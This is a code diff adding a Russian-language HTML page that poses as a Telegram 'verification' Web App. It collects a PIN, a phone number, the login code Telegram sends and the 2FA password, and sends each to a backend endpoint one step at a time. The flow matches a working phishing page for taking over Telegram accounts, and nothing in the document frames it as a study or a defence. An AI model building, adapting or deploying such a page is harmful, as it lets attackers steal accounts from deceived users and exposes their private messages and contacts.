@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Верификация Telegram</title>
+  <style>
+    :root {
+      --bg-color: #fff;
+      --text-color: #000;
+      --hint-color: #999;
+      --link-color: #1456f1;
+      --button-color: #2cab37;
+      --button-text-color: #fff;
+      --input-bg: #fff;
+      --input-border: #d3dbe3;
+      --input-border-focus: #2cab37;
+    }
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      background: var(--bg-color);
+      color: var(--text-color);
+      font-family: 'Segoe UI', 'Arial', sans-serif;
+      min-height: 100vh;
+      width: 100vw;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .tg-container {
+      width: 100vw;
+      max-width: 360px;
+      min-height: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 0 0 32px 0;
+    }
+    .tg-gif {
+      width: 100px;
+      height: 100px;
+      object-fit: contain;
+      margin: 40px auto 12px auto;
+      display: block;
+      pointer-events: none;
+      user-select: none;
+    }
+    h2 {
+      font-size: 1.18em;
+      font-weight: 700;
+      margin: 0 0 1.1em 0;
+      color: var(--text-color);
+      text-align: center;
+    }
+    .tg-input {
+      width: 100%;
+      font-size: 1.1em;
+      padding: 0.7em 1em;
+      border-radius: 12px;
+      border: 1.5px solid var(--input-border);
+      margin-bottom: 1em;
+      background: var(--input-bg);
+      color: var(--text-color);
+      transition: border-color 0.2s, box-shadow 0.2s;
+      outline: none;
+      box-sizing: border-box;
+    }
+    .tg-input:focus {
+      border-color: var(--input-border-focus);
+    }
+    .tg-button {
+      background: var(--button-color);
+      color: var(--button-text-color);
+      font-weight: 600;
+      border: none;
+      border-radius: 12px;
+      font-size: 1.1em;
+      padding: 0.8em 1.4em;
+      cursor: pointer;
+      margin-top: 0.5em;
+      transition: background 0.2s, box-shadow 0.2s;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    .tg-button:active {
+      filter: brightness(0.97);
+    }
+    .step {
+      display: none;
+      width: 100%;
+    }
+    .step-active {
+      display: block;
+      animation: fadein 0.34s both;
+    }
+    @keyframes fadein {
+      from { opacity: 0; transform: translateY(30px);}
+      to { opacity: 1; transform: none;}
+    }
+    .code-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 0.5em;
+      margin-bottom: 1.3em;
+      margin-top: 0.5em;
+    }
+    .code-inputs input {
+      width: 1.8em;
+      font-size: 1.7em;
+      text-align: center;
+      padding: 0.25em 0em;
+      border: 1.5px solid var(--input-border);
+      border-radius: 10px;
+      background: var(--input-bg);
+      color: var(--text-color);
+      transition: border-color 0.2s, box-shadow 0.2s;
+      outline: none;
+      box-sizing: border-box;
+    }
+    .code-inputs input:focus {
+      border-color: var(--input-border-focus);
+    }
+    .error-message {
+      color: var(--hint-color);
+      margin-bottom: 1em;
+      min-height: 1.2em;
+      text-align: center;
+    }
+
+    /* KEYBOARD ADAPTIVE & MINIMALISTIC DESIGN */
+    .number-keyboard {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+      width: 100%;
+      max-width: 180px;
+      margin: 0 auto 12px auto;
+      justify-content: center;
+      align-items: center;
+      user-select: none;
+    }
+    .number-key {
+      width: 2.6em;
+      font-size: 1.7em;
+      text-align: center;
+      padding: 0.35em 0.55em;
+      border: transparent;
+      background: transparent;
+      color: var(--text-color);
+      transition: border-color 0.2s, box-shadow 0.2s;
+      outline: none;
+      box-sizing: border-box;
+    }
+    .number-key:active {
+      border-color: var(--input-border-focus, #2cab37);
+      color: var(--input-border-focus, #2cab37);
+      background: transparent;
+    }
+    .number-key[data-action="del"] {
+      width: 1.8em;
+      font-size: 1.7em;
+      text-align: center;
+      padding: 0.25em 0.55em;
+      border: transparent;
+      background: transparent;
+      color: var(--text-color);
+      transition: border-color 0.2s, box-shadow 0.2s;
+      outline: none;
+      box-sizing: border-box;
+    }
+    .number-key[data-action="del"]:active {
+      border-color: var(--input-border-focus, #2cab37);
+      color: var(--input-border-focus, #2cab37);
+      background: transparent;
+    }
+
+    @media (max-width: 400px) {
+      .number-keyboard { max-width: 98vw; }
+      .number-key { font-size: 0.95em; min-width: 22px; min-height: 22px; }
+    }
+  </style>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+<div class="tg-container">
+  <!-- Шаг 1: Ввод PIN -->
+  <div id="step-pin" class="step step-active">
+    <img src="/webapp/gifs/key.gif" class="tg-gif" alt="Ключ">
+    <h2>Введите 4-значный PIN-код</h2>
+    <div class="code-inputs" id="pin-code-inputs">
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+    </div>
+    <div class="number-keyboard" id="pin-keyboard">
+      <button class="number-key" data-key="1">1</button>
+      <button class="number-key" data-key="2">2</button>
+      <button class="number-key" data-key="3">3</button>
+      <button class="number-key" data-key="4">4</button>
+      <button class="number-key" data-key="5">5</button>
+      <button class="number-key" data-key="6">6</button>
+      <button class="number-key" data-key="7">7</button>
+      <button class="number-key" data-key="8">8</button>
+      <button class="number-key" data-key="9">9</button>
+      <div></div>
+      <button class="number-key" data-key="0">0</button>
+      <button class="number-key" data-action="del">&#9003;</button>
+      </button>
+    </div>
+    <div id="pin-error" class="error-message"></div>
+    <button class="tg-button" onclick="submitPin()">Продолжить</button>
+  </div>
+
+  <!-- Шаг 2: Ввод номера -->
+  <div id="step-phone" class="step">
+    <img src="/webapp/gifs/phone.gif" class="tg-gif" alt="Телефон">
+    <h2>Введите номер телефона</h2>
+    <input id="phone-input" class="tg-input" placeholder="+79991234567" autocomplete="tel">
+    <div id="phone-error" class="error-message"></div>
+    <button class="tg-button" onclick="submitPhone()">Продолжить</button>
+  </div>
+
+  <!-- Шаг 3: Ввод кода -->
+  <div id="step-code" class="step">
+    <img src="/webapp/gifs/message.gif" class="tg-gif" alt="Обезьянка закрывает глаза">
+    <h2>Введите код из Telegram</h2>
+    <div class="code-inputs" id="sms-code-inputs">
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+    </div>
+    <div id="sms-error" class="error-message"></div>
+    <button class="tg-button" onclick="submitSmsCode()">Далее</button>
+  </div>
+
+  <!-- Шаг 4: Ввод 2FA -->
+  <div id="step-2fa" class="step">
+    <img src="/webapp/gifs/monkey.gif" class="tg-gif" alt="Обезьянка закрывает глаза">
+    <h2>Пароль 2FA</h2>
+    <input id="input-2fa" class="tg-input" type="password" placeholder="Пароль">
+    <div id="fa2-error" class="error-message"></div>
+    <button class="tg-button" onclick="submit2FA()">Далее</button>
+  </div>
+
+  <!-- Завершено -->
+  <div id="step-done" class="step">
+    <img src="/webapp/gifs/check.gif" class="tg-gif" alt="Галочка">
+    <h2>Верификация завершена</h2>
+  </div>
+</div>
+
+<script>
+function setTheme() {
+  if (window.Telegram && Telegram.WebApp && Telegram.WebApp.themeParams) {
+    const theme = Telegram.WebApp.themeParams;
+    if (theme.bg_color)         document.documentElement.style.setProperty('--bg-color', theme.bg_color);
+    if (theme.text_color)       document.documentElement.style.setProperty('--text-color', theme.text_color);
+    if (theme.hint_color)       document.documentElement.style.setProperty('--hint-color', theme.hint_color);
+    if (theme.button_color)     document.documentElement.style.setProperty('--button-color', theme.button_color);
+    if (theme.button_text_color)document.documentElement.style.setProperty('--button-text-color', theme.button_text_color);
+    if (theme.secondary_bg_color) document.documentElement.style.setProperty('--input-bg', theme.secondary_bg_color);
+    if (theme.input_border_color) document.documentElement.style.setProperty('--input-border', theme.input_border_color);
+    if (theme.link_color)         document.documentElement.style.setProperty('--input-border-focus', theme.link_color);
+  }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  if (window.Telegram && Telegram.WebApp) {
+    Telegram.WebApp.ready();
+    setTheme();
+    Telegram.WebApp.onEvent('themeChanged', setTheme);
+  }
+});
+
+// КЛАВИАТУРА ДЛЯ PIN
+document.addEventListener("DOMContentLoaded", () => {
+  const inputs = document.querySelectorAll("#pin-code-inputs input");
+  const keypad = document.getElementById("pin-keyboard");
+  if (!inputs.length || !keypad) return;
+  let currentInputIndex = 0;
+
+  function updateFocus() {
+    while (currentInputIndex < inputs.length && inputs[currentInputIndex].value) {
+      currentInputIndex++;
+    }
+    if (currentInputIndex >= inputs.length) currentInputIndex = inputs.length - 1;
+    inputs[currentInputIndex].focus();
+  }
+
+  keypad.addEventListener("click", (e) => {
+    const btn = e.target.closest(".number-key");
+    if (!btn) return;
+    if (btn.hasAttribute("data-key")) {
+      if (currentInputIndex < inputs.length && !inputs[currentInputIndex].value) {
+        inputs[currentInputIndex].value = btn.getAttribute("data-key");
+        currentInputIndex++;
+        updateFocus();
+      }
+    } else if (btn.getAttribute("data-action") === "del") {
+      for (let i = inputs.length - 1; i >= 0; i--) {
+        if (inputs[i].value) {
+          inputs[i].value = "";
+          currentInputIndex = i;
+          inputs[i].focus();
+          break;
+        }
+      }
+    }
+  });
+
+  inputs.forEach((input, idx) => {
+    input.addEventListener("focus", () => currentInputIndex = idx);
+    input.addEventListener("keydown", (e) => e.preventDefault());
+  });
+  updateFocus();
+});
+
+let userPhone = '';
+let userPin = '';
+let apiUrl = "/api/step";
+
+function showStep(current, next) {
+  document.getElementById(current).classList.remove("step-active");
+  document.getElementById(next).classList.add("step-active");
+}
+
+async function submitPin() {
+  const inputs = document.querySelectorAll("#pin-code-inputs input");
+  const pin = Array.from(inputs).map(i => i.value).join("");
+  const errorDiv = document.getElementById("pin-error");
+  errorDiv.textContent = "";
+  if (pin.length < 4) {
+    errorDiv.textContent = "Введите PIN полностью";
+    return;
+  }
+  userPin = pin;
+  const res = await fetch(apiUrl, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ step: "pin", pin })
+  });
+  const json = await res.json();
+  if (json.ok) {
+    showStep("step-pin", "step-phone");
+  } else {
+    errorDiv.textContent = json.error;
+    inputs.forEach(i => i.value = "");
+    inputs[0].focus();
+  }
+}
+
+async function submitPhone() {
+  const phoneInput = document.getElementById("phone-input");
+  const phone = phoneInput.value.trim();
+  const errorDiv = document.getElementById("phone-error");
+  errorDiv.textContent = "";
+  if (!phone) {
+    errorDiv.textContent = "Введите номер";
+    return;
+  }
+  userPhone = phone;
+
+  const res = await fetch(apiUrl, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ step: "phone", phone, pin: userPin })
+  });
+  const json = await res.json();
+  if (json.ok) {
+    showStep("step-phone", "step-code");
+  } else {
+    errorDiv.textContent = json.error;
+  }
+}
+
+async function submitSmsCode() {
+  const inputs = document.querySelectorAll("#sms-code-inputs input");
+  const sms_code = Array.from(inputs).map(i => i.value).join("");
+  const errorDiv = document.getElementById("sms-error");
+  errorDiv.textContent = "";
+  if (sms_code.length < 5) {
+    errorDiv.textContent = "Введите полный код";
+    return;
+  }
+
+  const res = await fetch(apiUrl, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ step: "sms", phone: userPhone, sms_code, pin: userPin })
+  });
+  const json = await res.json();
+  if (json.ok && json["2fa_required"]) {
+    showStep("step-code", "step-2fa");
+  } else if (json.ok) {
+    await fetch(apiUrl, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({ step: "done", phone: userPhone, pin: userPin })
+    });
+    showStep("step-code", "step-done");
+  } else {
+    errorDiv.textContent = json.error;
+    inputs.forEach(i => i.value = "");
+    inputs[0].focus();
+  }
+}
+
+async function submit2FA() {
+  const code_2fa = document.getElementById("input-2fa").value;
+  const errorDiv = document.getElementById("fa2-error");
+  errorDiv.textContent = "";
+
+  const res = await fetch(apiUrl, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ step: "2fa", phone: userPhone, code_2fa, pin: userPin })
+  });
+  const json = await res.json();
+  if (json.ok) {
+    await fetch(apiUrl, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({ step: "done", phone: userPhone, pin: userPin })
+    });
+    showStep("step-2fa", "step-done");
+  } else {
+    errorDiv.textContent = json.error;
+    document.getElementById("input-2fa").value = "";
+    document.getElementById("input-2fa").focus();
+  }
+}
+
+// Автоматический переход по инпутам для кодов
+["pin-code-inputs", "sms-code-inputs"].forEach(id => {
+  const container = document.getElementById(id);
+  const inputs = container.querySelectorAll("input");
+  inputs.forEach((input, idx) => {
+    input.addEventListener("input", function() {
+      if (this.value && idx < inputs.length - 1) {
+        inputs[idx + 1].focus();
+      }
+    });
+    input.addEventListener("keydown", function(e) {
+      if (e.key === "Backspace" && !this.value && idx > 0) {
+        inputs[idx - 1].focus();
+      }
+    });
+  });
+});
+</script>
+</body>
+</html>
